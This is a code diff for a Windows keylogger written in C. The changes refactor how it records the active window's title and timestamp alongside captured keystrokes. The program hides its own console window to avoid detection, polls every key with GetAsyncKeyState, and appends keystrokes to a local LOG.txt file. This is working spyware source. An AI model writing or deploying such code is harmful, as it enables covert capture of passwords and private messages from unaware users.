@@ -8,14 +8,19 @@
 
 // FUNCTION DECLARATIONS //
 void HideWindow();
-void GetCurrentApplication(HWND *prev_window, FILE* logfile);
+void GetCurrentWindow(char* window, char* new_window, FILE* logfile);
 void KeystrokeHandler(short key, FILE* logfile);
 
 // MAIN FUNCTION //
 int main(){
+    // avoid visible detection of executable window
     HideWindow();
-    char prev_window[BUF_SIZE];
-    HWND prev_window;
+
+    // initialize the current window
+    char window[BUF_SIZE];
+    char new_window[BUF_SIZE];
+    HWND foreground = GetForegroundWindow();
+    GetWindowText(foreground, window, BUF_SIZE);
 
     while(1){
 
@@ -27,12 +32,11 @@ int main(){
             // check for key press
             // where -32767 means key is pressed
             if(GetAsyncKeyState(key) == -32767){
-                
+
                 // open/create keylog file then handle keystroke
                 FILE* logfile;
                 logfile = fopen("LOG.txt", "a");
-                GetCurrentApplication(prev_window, logfile);
-                
+                GetCurrentWindow(window, new_window, logfile);
                 KeystrokeHandler(key, logfile);
                 fclose(logfile);
             }
@@ -43,7 +47,7 @@ int main(){
 
 // FUNCTION DEFINITIONS //
 
-// hides the command prompt upon execution
+// hides the executable window
 void HideWindow(){
     HWND stealth;
     AllocConsole();
@@ -51,18 +55,22 @@ void HideWindow(){
     ShowWindow(stealth, 0); // set to 0 to not display
 }
 
-// finds the name of the current top-most window/application
-void GetCurrentApplication(HWND *prev_window, FILE* logfile){
-    HWND foreground = GetForegroundWindow();
-    if (foreground != prev_window){
-        prev_window = foreground;
-        
-        char curr_window[BUF_SIZE];
-        GetWindowText(foreground, curr_window, BUF_SIZE);
-        
-        time_t curr_time = time(NULL);
-        char* curr_time_str = ctime(&curr_time);
-        fprintf(logfile, "\nAPPLICATION: <%s> TIME: %s", curr_window, curr_time_str);
+// get the current working window of the user
+void GetCurrentWindow(char* window, char* new_window, FILE* logfile){
+    HWND new_foreground = GetForegroundWindow();
+    GetWindowText(new_foreground, window, BUF_SIZE);
+    
+    // check if window has changed/updated
+    if(strcmp(window, new_window)){
+        strcpy(new_window, window);
+        if(!strcmp(window, new_window) && strcmp(window, "")){
+            time_t curr_time = time(NULL);
+            char* curr_time_str = ctime(&curr_time);
+
+            // display current window and time to document the logged keystrokes
+            fprintf(logfile, "\n\nWINDOW: %s TIME: %s", new_window, curr_time_str);
+            fflush(logfile);
+        }
     }
 }
 
